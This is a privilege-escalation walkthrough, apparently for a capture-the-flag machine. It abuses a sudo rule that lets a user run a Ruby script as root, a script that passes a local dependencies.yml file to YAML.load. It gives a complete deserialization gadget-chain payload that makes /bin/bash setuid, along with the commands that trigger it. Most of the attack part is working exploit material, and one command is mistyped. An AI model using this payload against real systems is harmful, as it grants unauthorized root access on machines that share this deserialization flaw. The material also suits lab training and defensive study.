# Ruby Dependencies

When a user a allowed to run ruby dependencies.rb we can abuse it to escalate our privliges.

## i.e
```bash
$ sudo -l
Matching Defaults entries for henry on precious:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User henry may run the following commands on precious:
    (root) NOPASSWD: /usr/bin/ruby /opt/update_dependencies.rb

```

Now if we take a look at **/opt/update_dependencies.rb**. You'll see on line 8
that theres a file that this script execute when it runs. So what we'll do is to
create such a file that escalate our privelges, with name **dependencies.yml**
```bash
henry@precious:~$ cat /opt/update_dependencies.rb 
# Compare installed dependencies with those specified in "dependencies.yml"
require "yaml"
require 'rubygems'

# TODO: update versions automatically
def update_gems()
end

def list_from_file
    YAML.load(File.read("dependencies.yml")) #This file.
end

def list_local_gems
    Gem::Specification.sort_by{ |g| [g.name.downcase, g.version] }.map{|g| [g.name, g.version.to_s]}
end

gems_file = list_from_file
gems_local = list_local_gems

gems_file.each do |file_name, file_version|
    gems_local.each do |local_name, local_version|
        if(file_name == local_name)
            if(file_version != local_version)
                puts "Installed version differs from the one specified in file: " + local_name
            else
                puts "Installed version is equals to the one specified in file: " + local_name
            end
        end
    end
end

```

## Using this script below we can escalate our privliges.
Make sure to name it right `dependencies.yml`  
```YML
---
- !ruby/object:Gem::Installer
    i: x
- !ruby/object:Gem::SpecFetcher
    i: y
- !ruby/object:Gem::Requirement
  requirements:
    !ruby/object:Gem::Package::TarReader
    io: &1 !ruby/object:Net::BufferedIO
      io: &1 !ruby/object:Gem::Package::TarReader::Entry
         read: 0
         header: "abc"
      debug_output: &1 !ruby/object:Net::WriteAdapter
         socket: &1 !ruby/object:Gem::RequestSet
             sets: !ruby/object:Net::WriteAdapter
                 socket: !ruby/module 'Kernel'
                 method_id: :system
             git_set: "chmod +s /bin/bash"
         method_id: :resolve
```
Now run these commands below and you'll be root.
```bash
sudo /usr/bin/ruby /opt/update_dependencies.rb
```
```bash
s -al /bin/bash
```  
   
## How does the dependencies.yml script work.
The first object is an instance of the Ruby class Gem::Installer with a single instance variable i set to the value x.
The second object is an instance of the Ruby class Gem::SpecFetcher with a single instance variable i set to the value y.

The third object is an instance of the Ruby class Gem::Requirement. This object has a single key requirements that points to a complex nested object structure. The nested object structure starts with another instance of the Ruby class Gem::Package::TarReader. This object has a single key io that points to another instance of the Ruby class Net::BufferedIO. This object in turn has a single key io that points to another instance of the Ruby class Gem::Package::TarReader::Entry. This object has two keys: read set to 0 and header set to the string "abc".

Finally, the Net::BufferedIO object also has a key debug_output which points to another instance of the Ruby class Net::WriteAdapter. This object has two keys: socket which points to another instance of the Gem::RequestSet class, and method_id which is set to the symbol :resolve. The Gem::RequestSet instance also has two keys: sets which points to another instance of the Net::WriteAdapter class, and git_set which is set to the string "chmod +s /bin/bash".

